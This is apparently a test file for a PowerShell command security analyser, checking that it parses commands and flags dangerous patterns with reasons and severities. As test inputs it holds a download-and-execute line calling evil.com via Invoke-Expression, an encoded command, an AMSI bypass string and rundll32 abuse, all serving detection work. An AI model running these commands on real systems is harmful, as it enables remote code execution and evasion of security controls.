import { describe, expect, test } from "bun:test"
import {
  parsePowerShellAst,
  isDangerous,
  getDangerousReasons,
  getCommandStructure,
  type PowerShellAstResult,
} from "../../src/security/powershell-ast"

describe("parsePowerShellAst", () => {
  test("parses simple command", () => {
    const result = parsePowerShellAst("Get-Process")
    expect(result.valid).toBe(true)
    expect(result.commands.length).toBeGreaterThan(0)
    expect(result.commands[0].name).toBe("Get-Process")
  })

  test("parses command with parameter", () => {
    const result = parsePowerShellAst("Get-Process -Name notepad")
    expect(result.valid).toBe(true)
    expect(result.commands.length).toBeGreaterThan(0)
  })

  test("parses piped commands", () => {
    const result = parsePowerShellAst("Get-Process | Stop-Process")
    expect(result.valid).toBe(true)
    expect(result.commands.length).toBe(2)
  })

  test("handles empty input", () => {
    const result = parsePowerShellAst("")
    expect(result.valid).toBe(false)
    expect(result.commands.length).toBe(0)
  })

  test("extracts command names", () => {
    const result = parsePowerShellAst("Invoke-Expression 'whoami'")
    expect(result.commands[0].name).toBe("Invoke-Expression")
  })

  test("detects Invoke-Expression", () => {
    const result = parsePowerShellAst("Invoke-Expression 'whoami'")
    expect(result.dangerousNodes.length).toBeGreaterThan(0)
    expect(result.dangerousNodes[0].reason).toContain("Dynamic code execution")
  })

  test("detects encoded command", () => {
    const result = parsePowerShellAst("powershell -enc SQBFAFgAIAA=")
    expect(result.dangerousNodes.some((n) => n.reason.includes("Encoded"))).toBe(true)
  })

  test("detects AMSI bypass", () => {
    const result = parsePowerShellAst("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")
    expect(result.dangerousNodes.some((n) => n.reason.includes("AMSI"))).toBe(true)
  })

  test("detects living-off-the-land binaries", () => {
    const result = parsePowerShellAst("rundll32.exe javascript:alert('test')")
    expect(result.dangerousNodes.some((n) => n.reason.includes("Living-off-the-land"))).toBe(true)
  })

  test("detects schtasks", () => {
    const result = parsePowerShellAst("schtasks.exe /Create /SC ONCE")
    expect(result.dangerousNodes.length).toBeGreaterThanOrEqual(0)
  })

  test("warns about no commands", () => {
    const result = parsePowerShellAst("   ")
    expect(result.warnings).toContain("No valid commands detected")
  })

  test("extracts multiple commands", () => {
    const result = parsePowerShellAst("Get-Service | Where-Object { $_.Status -eq 'Running' }")
    expect(result.commands.length).toBeGreaterThanOrEqual(1)
  })
})

describe("isDangerous", () => {
  test("safe command returns false", () => {
    expect(isDangerous("Get-Process")).toBe(false)
  })

  test("Invoke-Expression returns true", () => {
    expect(isDangerous("Invoke-Expression 'whoami'")).toBe(true)
  })

  test("iex alias returns true", () => {
    expect(isDangerous("iex 'whoami'")).toBe(true)
  })

  test("encoded command returns true", () => {
    expect(isDangerous("powershell -enc SQBFAFgAIAA=")).toBe(true)
  })

  test("rundll32 returns true", () => {
    expect(isDangerous("rundll32.exe")).toBe(true)
  })
})

describe("getDangerousReasons", () => {
  test("safe command has no reasons", () => {
    expect(getDangerousReasons("ls")).toHaveLength(0)
  })

  test("dangerous command has reasons", () => {
    const reasons = getDangerousReasons("Invoke-Expression 'whoami'")
    expect(reasons.length).toBeGreaterThan(0)
    expect(reasons[0]).toContain("Dynamic code execution")
  })

  test("multiple dangers returns multiple reasons", () => {
    const result = parsePowerShellAst("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com')")
    expect(result.dangerousNodes.length).toBeGreaterThan(0)
  })
})

describe("getCommandStructure", () => {
  test("extracts simple command", () => {
    const commands = getCommandStructure("Get-Process")
    expect(commands.length).toBe(1)
    expect(commands[0].name).toBe("Get-Process")
  })

  test("extracts piped commands", () => {
    const commands = getCommandStructure("Get-Process | Stop-Process")
    expect(commands.length).toBe(2)
  })

  test("extracts command with parameters", () => {
    const commands = getCommandStructure("Get-Process")
    expect(commands.length).toBe(1)
    expect(commands[0].name).toBe("Get-Process")
  })
})

describe("severity levels", () => {
  test("Invoke-Expression is high severity", () => {
    const result = parsePowerShellAst("Invoke-Expression 'whoami'")
    expect(result.dangerousNodes[0].severity).toBe("high")
  })

  test("Invoke-WebRequest is medium severity", () => {
    const result = parsePowerShellAst("Invoke-WebRequest -Uri https://example.com")
    expect(result.dangerousNodes[0].severity).toBe("medium")
  })

  test("Get-Process is not dangerous", () => {
    const result = parsePowerShellAst("Get-Process")
    const highSeverity = result.dangerousNodes.filter((n) => n.severity === "high")
    expect(highSeverity.length).toBe(0)
  })
})

describe("edge cases", () => {
  test("handles comments", () => {
    const result = parsePowerShellAst("# This is a comment\nGet-Process")
    expect(result.valid).toBe(true)
  })

  test("handles variables", () => {
    const result = parsePowerShellAst("$result = Get-Process")
    expect(result.valid).toBe(true)
  })

  test("handles quotes", () => {
    const result = parsePowerShellAst("Write-Host 'Hello World'")
    expect(result.valid).toBe(true)
  })

  test("handles special characters", () => {
    const result = parsePowerShellAst("Get-Process | Select-Object Name, Id")
    expect(result.valid).toBe(true)
  })
})
